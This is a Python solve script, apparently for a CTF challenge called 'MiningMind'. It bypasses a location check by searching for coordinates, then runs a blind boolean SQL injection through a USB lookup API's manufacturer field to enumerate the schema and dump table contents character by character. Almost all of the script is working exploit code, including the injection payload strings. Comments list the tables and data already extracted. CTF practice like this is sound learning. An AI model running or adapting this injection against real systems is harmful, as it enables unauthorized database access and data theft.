#!/usr/bin/env python3
import requests
import string
import sys


SESSION = requests.Session()
BASE_URL = 'https://miningmind.wutctf.space/'
AUTH_ENDPOINT = BASE_URL + 'api/auth'
USB_ENDPOINT = BASE_URL + 'api/usb'

LAT_BOUNDS = (-90, 90)
LNG_BOUNDS = (-180, 180)
HEAD_QUARTERS = (-45.423975728378025, -157.47046238434746)


def post_location(coords):
    lat, lng = coords
    return SESSION.post(AUTH_ENDPOINT, json={
        'latitude': lat,
        'longitude': lng,
    }).json()


def get_distance(coords):
    return post_location(coords).get('distance')


def search_coord(bounds, other, prev_dist, pack):
    hi, lo = bounds
    third = (hi - lo) / 3
    left = lo + third
    right  = lo + 2 * third

    left_dist = get_distance(pack(left, other))
    right_dist = get_distance(pack(right, other))

    if left_dist < right_dist:
        hi = right
        coord = left
        dist = left_dist
    else:
        lo = left
        coord = right
        dist = right_dist

    delta = prev_dist - dist
    if delta == 0:
        return coord
    else:
        return search_coord((lo, hi), other, dist, pack)


def search_lat(lng):
    return search_coord(
        LAT_BOUNDS,
        lng,
        0,
        lambda fst, snd: (fst, snd)
    )

def search_lng(lat):
    return search_coord(
        LNG_BOUNDS,
        lat,
        0,
        lambda fst, snd: (snd, fst)
    )

def authenticate():
    print("Authenticating with saved location")
    post_location(HEAD_QUARTERS)
    if SESSION.cookies.get('session') is None:
        print("Saved authentication location not accepted, searching for valid location")
        lng = search_lng(0)
        lat = search_lat(lng)
        print("Location found at {} E {} N".format(lng, lat))
        return post_location((lat, lng)).get('access')


def probe(response):
    print('\n\trequest:')
    print(response.request.headers)
    print(response.request.body)
    print('\n\tresponse:')
    print(response.status_code)
    print(response.headers)
    print(response.text)


def post_usb(manufacturer, product):
    return SESSION.post(USB_ENDPOINT, json={
        'manufacturer_name': manufacturer,
        'product_name': product,
    })


def count_rows(tbl):
    print("Counting rows in table {}".format(tbl))
    QUERY_FMT = "'OR {cnt}=(SELECT COUNT(*) FROM {tbl})) tmp #"
    cnt_found = False
    cnt = 0
    while not cnt_found:
        cnt += 1
        cnt_found = post_usb(
            QUERY_FMT.format(cnt=cnt, tbl=tbl),
            ''
        ).json()['supported']
    return cnt


def oracle(c, col, pos, tbl, cond, row):
    QUERY_FMT = "'OR BINARY '{c}'=(SELECT MID({col},{pos},1) FROM {tbl} WHERE {cond} LIMIT {row},1)) tmp #"
    payload = QUERY_FMT.format(c=c, col=col, pos=pos, tbl=tbl, cond=cond, row=row)
    response = post_usb(payload, '')
    if response.status_code != 200:
        return False
    return response.json()['supported']

def dump_value(col, tbl, cond, row):
    value = ""
    hit = True
    i = 0
    while hit:
        i += 1
        hit = False
        for c in string.printable:
            hit = oracle(c, col, i, tbl, cond, row)
            if hit:
                print(c, end='')
                sys.stdout.flush()
                value += c
                break
        if not hit:
            break
    print()
    return value


def dump_column(col, tbl, cond):
    print("Dumping values of {col} in table {tbl} where {cond} applies".format(col=col, tbl=tbl, cond=cond))
    values = []
    val = "bogus"
    row = -1
    while len(val) > 0:
        row += 1
        val = dump_value(col, tbl, cond, row)
        values.append(val)
    return values


def main():
    authenticate()

    # get table names
    # dump_column('table_name', 'information_schema.tables', 'true')
    # [..., 'brains', 'interfaces', 'locations']

    # get column names of the brains table
    # dump_column('column_name', 'information_schema.columns', "table_name='brains'")
    # ['id', 'model']

    # get column names of the interfaces table
    # dump_column('column_name', 'information_schema.columns', "table_name='interfaces'")
    # ['id', 'product', 'manufacturer']

    # get column names of the locations table
    # dump_column('column_name', 'information_schema.columns', "table_name='locations'")
    # ['id', 'longitude', 'latitude']

    # get row count per table
    # count_rows('brains')
    # 1
    # count_rows('interfaces')
    # 4
    # count_rows('locations')
    # ... too many

    # get contents of product column of the interfaces table
    # dump_column('product', 'interfaces', 'true')
    # ['B-ASIC MIND', 'Titan Brain', 'iAxe', 'iHammer']

    # get contents of manufacturer column of the interfaces table
    # dump_column('manufacturer', 'interfaces', 'true')
    # ['MiningMind Inc.', 'MiningMind Inc.', 'Apple Corp.', 'Apple Corp.']

    # get contents of model column of the brains table
    dump_column('model', 'brains', 'true')
    # the flag and a lot of extra stuff

if __name__ == '__main__':
    main()
